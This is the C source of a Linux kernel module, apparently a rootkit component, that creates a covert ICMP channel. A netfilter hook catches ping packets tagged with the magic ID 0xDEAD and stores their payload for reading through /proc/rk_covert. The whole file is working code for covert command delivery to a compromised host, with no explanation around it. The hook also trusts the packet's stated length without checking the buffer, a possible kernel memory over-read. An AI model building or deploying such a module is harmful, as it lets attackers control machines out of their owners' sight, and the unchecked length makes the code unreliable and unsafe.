// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/icmp.h>
#include <linux/init.h>
#include <linux/ip.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/spinlock.h>

#define COVERT_MAGIC 0xDEAD
#define MSG_MAX 256

static struct proc_dir_entry *entry;
static char last_msg[MSG_MAX];
static int msg_len;
static DEFINE_SPINLOCK(msg_lock);

static unsigned int covert_hook(void *priv, struct sk_buff *skb,
				const struct nf_hook_state *state)
{
	struct iphdr *iph;
	struct icmphdr *icmph;
	u8 *payload;
	int payload_len;
	unsigned long flags;

	if (!skb)
		return NF_ACCEPT;

	iph = ip_hdr(skb);
	if (!iph || iph->protocol != IPPROTO_ICMP)
		return NF_ACCEPT;

	icmph = (struct icmphdr *)((u8 *)iph + (iph->ihl * 4));
	if (icmph->type != ICMP_ECHO ||
	    ntohs(icmph->un.echo.id) != COVERT_MAGIC)
		return NF_ACCEPT;

	payload = (u8 *)icmph + sizeof(*icmph);
	payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - sizeof(*icmph);
	if (payload_len <= 0 || payload_len >= MSG_MAX)
		return NF_ACCEPT;

	spin_lock_irqsave(&msg_lock, flags);
	memcpy(last_msg, payload, payload_len);
	last_msg[payload_len] = '\0';
	msg_len = payload_len;
	spin_unlock_irqrestore(&msg_lock, flags);

	pr_info("rk: covert message received (%d bytes)\n", payload_len);
	return NF_ACCEPT;
}

static struct nf_hook_ops nf_ops = {
	.hook     = covert_hook,
	.pf       = NFPROTO_IPV4,
	.hooknum  = NF_INET_PRE_ROUTING,
	.priority = NF_IP_PRI_FIRST,
};

static int covert_read(struct seq_file *m, void *v)
{
	seq_printf(m, "magic=0x%x\nmsg=%s\n",
		   COVERT_MAGIC, msg_len ? last_msg : "(none)");
	return 0;
}


static int __init covert_init(void)
{
	int err;

	err = nf_register_net_hook(&init_net, &nf_ops);
	if (err)
		return err;

	entry = proc_create_single("rk_covert", 0444, NULL, covert_read);
	if (!entry) {
		nf_unregister_net_hook(&init_net, &nf_ops);
		return -ENOMEM;
	}

	pr_info("rk: covert channel active, magic=0x%x\n", COVERT_MAGIC);
	return 0;
}

static void __exit covert_exit(void)
{
	proc_remove(entry);
	nf_unregister_net_hook(&init_net, &nf_ops);
}

module_init(covert_init);
module_exit(covert_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Covert ICMP channel");
